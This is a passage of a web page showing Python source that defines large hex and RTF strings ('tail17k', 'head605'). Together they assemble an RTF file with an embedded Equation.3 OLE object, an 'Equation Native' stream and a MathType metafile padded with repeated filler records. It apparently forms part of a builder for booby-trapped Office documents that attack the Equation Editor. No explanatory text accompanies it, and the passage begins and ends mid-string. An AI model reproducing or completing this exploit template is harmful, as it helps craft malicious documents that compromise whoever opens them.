1D0000001E0000001F000000200000002100000022000000230000002400000025000000260000002700000028000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500FFFFFFFFFFFFFFFF0200000002CE020000000000C00000000000004600000000000000000000000070B01C713B64D30103000000000100000000000001004F006C00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000A000201FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000001400000000000000010043006F006D0070004F0062006A00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF00000000000000000000000000000000000000000000000000000000000000000000000001000000660000000000000003004F0062006A0049006E0066006F0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012000201FFFFFFFF04000000FFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000030000000600000000000000FEFFFFFF02000000FEFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF010000020800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100FEFF030A0000FFFFFFFF02CE020000000000C000000000000046170000004D6963726F736F6674204571756174696F6E20332E30000C0000004453204571756174696F6E000B0000004571756174696F6E2E3300F439B271000000000000000000000000000000000000000000000000000000000000000000000000000000000300040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004500710075006100740069006F006E0020004E00610074006900760065000000000000000000000000000000000000000000000000000000000000000000000020000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000500000087460000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">tail17k = <span class="string">r&#x27;&#x27;&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001050000050000000D0000004D45544146494C455049435400F6750000D58CFFFF6A2E00000800F6752B7300000100090000033117000002001C00000000000500000009020000000005000000020101000000050000000102FFFFFF00050000002E0118000000050000000B0200000000050000000C024080006B1200000026060F001A00FFFFFFFF000010000000C0FFFFFF1E000000C06A00005E8000000B00000026060F000C004D617468547970650000E01F1C000000FB0280FE0000000000009001010000000402001054696D6573204E657720526F6D616E00FEFFFFFF21160A6300000A0000000000040000002D01000008000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320AE17FBA340100000061000C000000320AE17F3A2D0A000000616161616161616161610C000000320AE17FBA250A000000616161616161616161610C000000320AE17F3A1E0A000000616161616161616161610C000000320AE17FBA160A000000616161616161616161610C000000320AE17F3A0F0A000000616161616161616161610C000000320AE17FBA070A000000616161616161616161610C000000320AE17F3A000A0000006161616161616161616108000000320A087FBA340100000061000C000000320A087F3A2D0A000000616161616161616161610C000000320A087FBA250A000000616161616161616161610C000000320A087F3A1E0A000000616161616161616161610C000000320A087FBA160A000000616161616161616161610C000000320A087F3A0F0A000000616161616161616161610C000000320A087FBA070A000000616161616161616161610C000000320A087F3A000A0000006161616161616161616108000000320AC87CBA340100000061000C000000320AC87C3A2D0A000000616161616161616161610C000000320AC87CBA250A000000616161616161616161610C000000320AC87C3A1E0A000000616161616161616161610C000000320AC87CBA160A000000616161616161616161610C000000320AC87C3A0F0A000000616161616161616161610C000000320AC87CBA070A000000616161616161616161610C000000320AC87C3A000A0000006161616161616161616108000000320A887ABA340100000061790C000000320A887A3A2D0A000000616161616161616161610C000000320A887ABA250A000000616161616161616161610C000000320A887A3A1E0A000000616161616161616161610C000000320A887ABA160A000000616161616161616161610C000000320A887A3A0F0A000000616161616161616161610C000000320A887ABA070A000000616161616161616161610C000000320A887A3A000A0000006161616161616161616108000000320A4878BA340100000061000C000000320A48783A2D0A000000616161616161616161610C000000320A4878BA250A000000616161616161616161610C000000320A48783A1E0A000000616161616161616161610C000000320A4878BA160A000000616161616161616161610C000000320A48783A0F0A000000616161616161616161610C000000320A4878BA070A000000616161616161616161610C000000320A48783A000A0000006161616161616161616108000000320A0876BA340100000061000C000000320A08763A2D0A000000616161616161616161610C000000320A0876BA250A000000616161616161616161610C000000320A08763A1E0A000000616161616161616161610C000000320A0876BA160A000000616161616161616161610C000000320A08763A0F0A000000616161616161616161610C000000320A0876BA070A000000616161616161616161610C000000320A08763A000A0000006161616161616161616108000000320AC873BA340100000061000C000000320AC8733A2D0A000000616161616161616161610C000000320AC873BA250A000000616161616161616161610C000000320AC8733A1E0A000000616161616161616161610C000000320AC873BA160A000000616161616161616161610C000000320AC8733A0F0A000000616161616161616161610C000000320AC873BA070A000000616161616161616161610C000000320AC8733A000A0000006161616161616161616108000000320A8871BA340100000061000C000000320A88713A2D0A000000616161616161616161610C000000320A8871BA250A000000616161616161616161610C000000320A88713A1E0A000000616161616161616161610C000000320A8871BA160A000000616161616161616161610C000000320A88713A0F0A000000616161616161616161610C000000320A8871BA070A000000616161616161616161610C000000320A88713A000A0000006161616161616161616108000000320A486FBA340100000061000C000000320A486F3A2D0A000000616161616161616161610C000000320A486FBA250A000000616161616161616161610C000000320A486F3A1E0A000000616161616161616161610C000000320A486FBA160A000000616161616161616161610C000000320A486F3A0F0A000000616161616161616161610C000000320A486FBA070A000000616161616161616161610C000000320A486F3A000A0000006161616161616161616108000000320A086DBA340100000061000C000000320A086D3A2D0A000000616161616161616161610C000000320A086DBA250A000000616161616161616161610C000000320A086D3A1E0A000000616161616161616161610C000000320A086DBA160A000000616161616161616161610C000000320A086D3A0F0A000000616161616161616161610C000000320A086DBA070A000000616161616161616161610C000000320A086D3A000A0000006161616161616161616108000000320AC86ABA340100000061000C000000320AC86A3A2D0A000000616161616161616161610C000000320AC86ABA250A000000616161616161616161610C000000320AC86A3A1E0A000000616161616161616161610C000000320AC86ABA160A000000616161616161616161610C000000320AC86A3A0F0A000000616161616161616161610C000000320AC86ABA070A000000616161616161616161610C000000320AC86A3A000A0000006161616161616161616108000000320A8868BA340100000061000C000000320A88683A2D0A000000616161616161616161610C000000320A8868BA250A000000616161616161616161610C000000320A88683A1E0A000000616161616161616161610C000000320A8868BA160A000000616161616161616161610C000000320A88683A0F0A000000616161616161616161610C000000320A8868BA070A000000616161616161616161610C000000320A88683A000A0000006161616161616161616108000000320A4866BA340100000061000C000000320A48663A2D0A000000616161616161616161610C000000320A4866BA250A000000616161616161616161610C000000320A48663A1E0A000000616161616161616161610C000000320A4866BA160A000000616161616161616161610C000000320A48663A0F0A000000616161616161616161610C000000320A4866BA070A000000616161616161616161610C000000320A48663A000A0000006161616161616161616108000000320A0864BA340100000061000C000000320A08643A2D0A000000616161616161616161610C000000320A0864BA250A000000616161616161616161610C000000320A08643A1E0A000000616161616161616161610C000000320A0864BA160A000000616161616161616161610C000000320A08643A0F0A000000616161616161616161610C000000320A0864BA070A000000616161616161616161610C000000320A08643A000A0000006161616161616161616108000000320AC861BA340100000061000C000000320AC8613A2D0A000000616161616161616161610C000000320AC861BA250A000000616161616161616161610C000000320AC8613A1E0A000000616161616161616161610C000000320AC861BA160A000000616161616161616161610C000000320AC8613A0F0A000000616161616161616161610C000000320AC861BA070A000000616161616161616161610C000000320AC8613A000A0000006161616161616161616108000000320A885FBA340100000061000C000000320A885F3A2D0A000000616161616161616161610C000000320A885FBA250A000000616161616161616161610C000000320A885F3A1E0A000000616161616161616161610C000000320A885FBA160A000000616161616161616161610C000000320A885F3A0F0A000000616161616161616161610C000000320A885FBA070A000000616161616161616161610C000000320A885F3A000A0000006161616161616161616108000000320A485DBA340100000061000C000000320A485D3A2D0A000000616161616161616161610C000000320A485DBA250A000000616161616161616161610C000000320A485D3A1E0A000000616161616161616161610C000000320A485DBA160A000000616161616161616161610C000000320A485D3A0F0A000000616161616161616161610C000000320A485DBA070A000000616161616161616161610C000000320A485D3A000A0000006161616161616161616108000000320A085BBA340100000061000C000000320A085B3A2D0A000000616161616161616161610C000000320A085BBA250A000000616161616161616161610C000000320A085B3A1E0A000000616161616161616161610C000000320A085BBA160A000000616161616161616161610C000000320A085B3A0F0A000000616161616161616161610C000000320A085BBA070A000000616161616161616161610C000000320A085B3A000A0000006161616161616161616108000000320AC858BA340100000061000C000000320AC8583A2D0A000000616161616161616161610C000000320AC858BA250A000000616161616161616161610C000000320AC8583A1E0A000000616161616161616161610C000000320AC858BA160A000000616161616161616161610C000000320AC8583A0F0A000000616161616161616161610C000000320AC858BA070A000000616161616161616161610C000000320AC8583A000A0000006161616161616161616108000000320A8856BA340100000061000C000000320A88563A2D0A000000616161616161616161610C000000320A8856BA250A000000616161616161616161610C000000320A88563A1E0A000000616161616161616161610C000000320A8856BA160A000000616161616161616161610C000000320A88563A0F0A000000616161616161616161610C000000320A8856BA070A000000616161616161616161610C000000320A88563A000A0000006161616161616161616108000000320A4854BA340100000061000C000000320A48543A2D0A000000616161616161616161610C000000320A4854BA250A000000616161616161616161610C000000320A48543A1E0A000000616161616161616161610C000000320A4854BA160A000000616161616161616161610C000000320A48543A0F0A000000616161616161616161610C000000320A4854BA070A000000616161616161616161610C000000320A48543A000A0000006161616161616161616108000000320A0852BA340100000061000C000000320A08523A2D0A000000616161616161616161610C000000320A0852BA250A000000616161616161616161610C000000320A08523A1E0A000000616161616161616161610C000000320A0852BA160A000000616161616161616161610C000000320A08523A0F0A000000616161616161616161610C000000320A0852BA070A000000616161616161616161610C000000320A08523A000A0000006161616161616161616108000000320AC84FBA340100000061000C000000320AC84F3A2D0A000000616161616161616161610C000000320AC84FBA250A000000616161616161616161610C000000320AC84F3A1E0A000000616161616161616161610C000000320AC84FBA160A000000616161616161616161610C000000320AC84F3A0F0A000000616161616161616161610C000000320AC84FBA070A000000616161616161616161610C000000320AC84F3A000A0000006161616161616161616108000000320A884DBA340100000061000C000000320A884D3A2D0A000000616161616161616161610C000000320A884DBA250A000000616161616161616161610C000000320A884D3A1E0A000000616161616161616161610C000000320A884DBA160A000000616161616161616161610C000000320A884D3A0F0A000000616161616161616161610C000000320A884DBA070A000000616161616161616161610C000000320A884D3A000A0000006161616161616161616108000000320A484BBA340100000061000C000000320A484B3A2D0A000000616161616161616161610C000000320A484BBA250A000000616161616161616161610C000000320A484B3A1E0A000000616161616161616161610C000000320A484BBA160A000000616161616161616161610C000000320A484B3A0F0A000000616161616161616161610C000000320A484BBA070A000000616161616161616161610C000000320A484B3A000A0000006161616161616161616108000000320A0849BA340100000061000C000000320A08493A2D0A000000616161616161616161610C000000320A0849BA250A000000616161616161616161610C000000320A08493A1E0A000000616161616161616161610C000000320A0849BA160A000000616161616161616161610C000000320A08493A0F0A000000616161616161616161610C000000320A0849BA070A000000616161616161616161610C000000320A08493A000A0000006161616161616161616108000000320AC846BA340100000061000C000000320AC8463A2D0A000000616161616161616161610C000000320AC846BA250A000000616161616161616161610C000000320AC8463A1E0A000000616161616161616161610C000000320AC846BA160A000000616161616161616161610C000000320AC8463A0F0A000000616161616161616161610C000000320AC846BA070A000000616161616161616161610C000000320AC8463A000A0000006161616161616161616108000000320A8844BA340100000061000C000000320A88443A2D0A000000616161616161616161610C000000320A8844BA250A000000616161616161616161610C000000320A88443A1E0A000000616161616161616161610C000000320A8844BA160A000000616161616161616161610C000000320A88443A0F0A000000616161616161616161610C000000320A8844BA070A000000616161616161616161610C000000320A88443A000A0000006161616161616161616108000000320A4842BA340100000061000C000000320A48423A2D0A000000616161616161616161610C000000320A4842BA250A000000616161616161616161610C000000320A48423A1E0A000000616161616161616161610C000000320A4842BA160A000000616161616161616161610C000000320A48423A0F0A000000616161616161616161610C000000320A4842BA070A000000616161616161616161610C000000320A48423A000A0000006161616161616161616108000000320A0840BA340100000061000C000000320A08403A2D0A000000616161616161616161610C000000320A0840BA250A000000616161616161616161610C000000320A08403A1E0A000000616161616161616161610C000000320A0840BA160A000000616161616161616161610C000000320A08403A0F0A000000616161616161616161610C000000320A0840BA070A000000616161616161616161610C000000320A08403A000A0000006161616161616161616108000000320AC83DBA340100000061000C000000320AC83D3A2D0A000000616161616161616161610C000000320AC83DBA250A000000616161616161616161610C000000320AC83D3A1E0A000000616161616161616161610C000000320AC83DBA160A000000616161616161616161610C000000320AC83D3A0F0A000000616161616161616161610C000000320AC83DBA070A000000616161616161616161610C000000320AC83D3A000A0000006161616161616161616108000000320A883BBA340100000061000C000000320A883B3A2D0A000000616161616161616161610C000000320A883BBA250A000000616161616161616161610C000000320A883B3A1E0A000000616161616161616161610C000000320A883BBA160A000000616161616161616161610C000000320A883B3A0F0A000000616161616161616161610C000000320A883BBA070A000000616161616161616161610C000000320A883B3A000A0000006161616161616161616108000000320A4839BA340100000061000C000000320A48393A2D0A000000616161616161616161610C000000320A4839BA250A000000616161616161616161610C000000320A48393A1E0A000000616161616161616161610C000000320A4839BA160A000000616161616161616161610C000000320A48393A0F0A000000616161616161616161610C000000320A4839BA070A000000616161616161616161610C000000320A48393A000A0000006161616161616161616108000000320A0837BA340100000061000C000000320A08373A2D0A000000616161616161616161610C000000320A0837BA250A000000616161616161616161610C000000320A08373A1E0A000000616161616161616161610C000000320A0837BA160A000000616161616161616161610C000000320A08373A0F0A000000616161616161616161610C000000320A0837BA070A000000616161616161616161610C000000320A08373A000A0000006161616161616161616108000000320AC834BA340100000061000C000000320AC8343A2D0A000000616161616161616161610C000000320AC834BA250A000000616161616161616161610C000000320AC8343A1E0A000000616161616161616161610C000000320AC834BA160A000000616161616161616161610C000000320AC8343A0F0A000000616161616161616161610C000000320AC834BA070A000000616161616161616161610C000000320AC8343A000A0000006161616161616161616108000000320A8832BA340100000061790C000000320A88323A2D0A000000616161616161616161610C000000320A8832BA250A000000616161616161616161610C000000320A88323A1E0A000000616161616161616161610C000000320A8832BA160A000000616161616161616161610C000000320A88323A0F0A000000616161616161616161610C000000320A8832BA070A000000616161616161616161610C000000320A88323A000A0000006161616161616161616108000000320A4830BA340100000061000C000000320A48303A2D0A000000616161616161616161610C000000320A4830BA250A000000616161616161616161610C000000320A48303A1E0A000000616161616161616161610C000000320A4830BA160A000000616161616161616161610C000000320A48303A0F0A000000616161616161616161610C000000320A4830BA070A000000616161616161616161610C000000320A48303A000A0000006161616161616161616108000000320A082EBA340100000061000C000000320A082E3A2D0A000000616161616161616161610C000000320A082EBA250A000000616161616161616161610C000000320A082E3A1E0A000000616161616161616161610C000000320A082EBA160A000000616161616161616161610C000000320A082E3A0F0A000000616161616161616161610C000000320A082EBA070A000000616161616161616161610C000000320A082E3A000A0000006161616161616161616108000000320AC82BBA340100000061000C000000320AC82B3A2D0A000000616161616161616161610C000000320AC82BBA250A000000616161616161616161610C000000320AC82B3A1E0A000000616161616161616161610C000000320AC82BBA160A000000616161616161616161610C000000320AC82B3A0F0A000000616161616161616161610C000000320AC82BBA070A000000616161616161616161610C000000320AC82B3A000A0000006161616161616161616108000000320A8829BA340100000061000C000000320A88293A2D0A000000616161616161616161610C000000320A8829BA250A000000616161616161616161610C000000320A88293A1E0A000000616161616161616161610C000000320A8829BA160A000000616161616161616161610C000000320A88293A0F0A000000616161616161616161610C000000320A8829BA070A000000616161616161616161610C000000320A88293A000A0000006161616161616161616108000000320A48273A690200000061610C000000320A4827BA610A000000616161616161616161610C000000320A48273A5A0A000000616161616161616161610C000000320A4827BA520A000000616161616161616161610C000000320A48273A4B0A000000616161616161616161610C000000320A4827BA430A000000616161616161616161610C000000320A48273A3C0A000000616161616161616161610C000000320A4827BA340A000000616161616161616161610C000000320A48273A2D0A000000616161616161616161610C000000320A4827BA250A000000616161616161616161610C000000320A48273A1E0A000000616161616161616161610C000000320A4827BA160A000000616161616161616161610C000000320A48273A0F0A000000616161616161616161610C000000320A4827BA070A000000616161616161616161610C000000320A48273A000A0000006161616161616161616108000000320A0825BA340100000061610C000000320A08253A2D0A000000616161616161616161610C000000320A0825BA250A000000616161616161616161610C000000320A08253A1E0A000000616161616161616161610C000000320A0825BA160A000000616161616161616161610C000000320A08253A0F0A000000616161616161616161610C000000320A0825BA070A000000616161616161616161610C000000320A08253A000A0000006161616161616161616108000000320AC822BA340100000061000C000000320AC8223A2D0A000000616161616161616161610C000000320AC822BA250A000000616161616161616161610C000000320AC8223A1E0A000000616161616161616161610C000000320AC822BA160A000000616161616161616161610C000000320AC8223A0F0A000000616161616161616161610C000000320AC822BA070A000000616161616161616161610C000000320AC8223A000A0000006161616161616161616108000000320A8820BA340100000061000C000000320A88203A2D0A000000616161616161616161610C000000320A8820BA250A000000616161616161616161610C000000320A88203A1E0A000000616161616161616161610C000000320A8820BA160A000000616161616161616161610C000000320A88203A0F0A000000616161616161616161610C000000320A8820BA070A000000616161616161616161610C000000320A88203A000A0000006161616161616161616108000000320A481EBA340100000061610C000000320A481E3A2D0A000000616161616161616161610C000000320A481EBA250A000000616161616161616161610C000000320A481E3A1E0A000000616161616161616161610C000000320A481EBA160A000000616161616161616161610C000000320A481E3A0F0A000000616161616161616161610C000000320A481EBA070A000000616161616161616161610C000000320A481E3A000A0000006161616161616161616108000000320A081CBA340100000061000C000000320A081C3A2D0A000000616161616161616161610C000000320A081CBA250A000000616161616161616161610C000000320A081C3A1E0A000000616161616161616161610C000000320A081CBA160A000000616161616161616161610C000000320A081C3A0F0A000000616161616161616161610C000000320A081CBA070A000000616161616161616161610C000000320A081C3A000A0000006161616161616161616108000000320AC819BA340100000061000C000000320AC8193A2D0A000000616161616161616161610C000000320AC819BA250A000000616161616161616161610C000000320AC8193A1E0A000000616161616161616161610C000000320AC819BA160A000000616161616161616161610C000000320AC8193A0F0A000000616161616161616161610C000000320AC819BA070A000000616161616161616161610C000000320AC8193A000A0000006161616161616161616108000000320A8817BA340100000061610C000000320A88173A2D0A000000616161616161616161610C000000320A8817BA250A000000616161616161616161610C000000320A88173A1E0A000000616161616161616161610C000000320A8817BA160A000000616161616161616161610C000000320A88173A0F0A000000616161616161616161610C000000320A8817BA070A000000616161616161616161610C000000320A88173A000A0000006161616161616161616108000000320A4815BA340100000061000C000000320A48153A2D0A000000616161616161616161610C000000320A4815BA250A000000616161616161616161610C000000320A48153A1E0A000000616161616161616161610C000000320A4815BA160A000000616161616161616161610C000000320A48153A0F0A000000616161616161616161610C000000320A4815BA070A000000616161616161616161610C000000320A48153A000A0000006161616161616161616108000000320A0813BA340100000061610C000000320A08133A2D0A000000616161616161616161610C000000320A0813BA250A000000616161616161616161610C000000320A08133A1E0A000000616161616161616161610C000000320A0813BA160A000000616161616161616161610C000000320A08133A0F0A000000616161616161616161610C000000320A0813BA070A000000616161616161616161610C000000320A08133A000A0000006161616161616161616108000000320AC810BA340100000061000C000000320AC8103A2D0A000000616161616161616161610C000000320AC810BA250A000000616161616161616161610C000000320AC8103A1E0A000000616161616161616161610C000000320AC810BA160A000000616161616161616161610C000000320AC8103A0F0A000000616161616161616161610C000000320AC810BA070A000000616161616161616161610C000000320AC8103A000A0000006161616161616161616108000000320A880EBA340100000061000C000000320A880E3A2D0A000000616161616161616161610C000000320A880EBA250A000000616161616161616161610C000000320A880E3A1E0A000000616161616161616161610C000000320A880EBA160A000000616161616161616161610C000000320A880E3A0F0A000000616161616161616161610C000000320A880EBA070A000000616161616161616161610C000000320A880E3A000A0000006161616161616161616108000000320A480CBA340100000061000C000000320A480C3A2D0A000000616161616161616161610C000000320A480CBA250A000000616161616161616161610C000000320A480C3A1E0A000000616161616161616161610C000000320A480CBA160A000000616161616161616161610C000000320A480C3A0F0A000000616161616161616161610C000000320A480CBA070A000000616161616161616161610C000000320A480C3A000A0000006161616161616161616108000000320A080ABA340100000061610C000000320A080A3A2D0A000000616161616161616161610C000000320A080ABA250A000000616161616161616161610C000000320A080A3A1E0A000000616161616161616161610C000000320A080ABA160A000000616161616161616161610C000000320A080A3A0F0A000000616161616161616161610C000000320A080ABA070A000000616161616161616161610C000000320A080A3A000A0000006161616161616161616108000000320AC807BA340100000061000C000000320AC8073A2D0A000000616161616161616161610C000000320AC807BA250A000000616161616161616161610C000000320AC8073A1E0A000000616161616161616161610C000000320AC807BA160A000000616161616161616161610C000000320AC8073A0F0A000000616161616161616161610C000000320AC807BA070A000000616161616161616161610C000000320AC8073A000A0000006161616161616161616108000000320A8805BA340100000061000C000000320A88053A2D0A000000616161616161616161610C000000320A8805BA250A000000616161616161616161610C000000320A88053A1E0A000000616161616161616161610C000000320A8805BA160A000000616161616161616161610C000000320A88053A0F0A000000616161616161616161610C000000320A8805BA070A000000616161616161616161610C000000320A88053A000A0000006161616161616161616108000000320A4803BA340100000061000C000000320A48033A2D0A000000616161616161616161610C000000320A4803BA250A000000616161616161616161610C000000320A48033A1E0A000000616161616161616161610C000000320A4803BA160A000000616161616161616161610C000000320A48033A0F0A000000616161616161616161610C000000320A4803BA070A000000616161616161616161610C000000320A48033A000A0000006161616161616161616108000000320A0801BA340100000061610C000000320A08013A2D0A000000616161616161616161610C000000320A0801BA250A000000616161616161616161610C000000320A08013A1E0A000000616161616161616161610C000000320A0801BA160A000000616161616161616161610C000000320A08013A0F0A000000616161616161616161610C000000320A0801BA070A000000616161616161616161610C000000320A08013A000A000000616161616161616161610A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000860102022253797374656D000021008A0200000A00CD1166F121008A02FFFFFFFF78EF1900040000002D01010004000000F0010000030000000000</span></span><br><span class="line"><span class="string">&#125;&#123;\result&#123;\pict&#123;\*\picprop&#125;\wmetafile8\picw380\pich260\picwgoal380\pichgoal260</span></span><br><span class="line"><span class="string">0100090000039e00000002001c0000000000050000000902000000000500000002010100000005</span></span><br><span class="line"><span class="string">0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002</span></span><br><span class="line"><span class="string">1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000</span></span><br><span class="line"><span class="string">0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000</span></span><br><span class="line"><span class="string">0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000</span></span><br><span class="line"><span class="string">002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100</span></span><br><span class="line"><span class="string">000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a</span></span><br><span class="line"><span class="string">0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300</span></span><br><span class="line"><span class="string">00000000</span></span><br><span class="line"><span class="string">&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">\par&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">head605 = <span class="string">r&#x27;&#x27;&#x27;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata 